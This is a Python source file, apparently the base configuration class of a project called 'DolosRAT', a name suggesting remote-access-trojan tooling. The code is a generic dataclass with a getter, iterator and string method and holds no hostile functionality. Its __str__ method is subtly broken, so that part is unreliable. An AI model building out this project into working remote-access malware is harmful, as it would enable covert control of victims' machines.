# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 07/06/2023
# version ='1.0'
# ---------------------------------------------------------------------------
"""
Houses the primary configuration for DolosRAT. 
Provides a class wherein child configs can inherit and
provide functionality-specific configurations.
"""

# Built-in/Generic Imports.
from dataclasses import dataclass
from typing import Any, Generator

@dataclass
class Config: 
    """Stores application and functionality-specific
    config. Specific configurations shall inherit from this
    base class, overriding _conf, and other functions, as 
    neccessary.
    """

    """ Stores functionality-specific config (any type). """
    _conf: Any

    @property
    def conf(self: object) -> Any: 
        """Getter method for _conf.

        May be overridden by inheriting config
        classes for returning differing types.

        Returns:
            Any: _conf of any type.
        """
        return self._conf

    # Permits the iteration of Configuration, or inherited, 
    # object.
    def __iter__(self: object) -> Generator[Any, Any, Any]: 
        """Enables iteration of a Config derivative.

        Yields:
            Generator[Any, Any, Any]: Iterable of _config attribute.
        """
        yield from self._conf

    def __str__(self: object) -> str: 
        """Friendly string representation of class.

        Returns:
            str: Friendly string of class for 
            later, more trivial comparison.
        """
        return f'{type(self.__name__)}'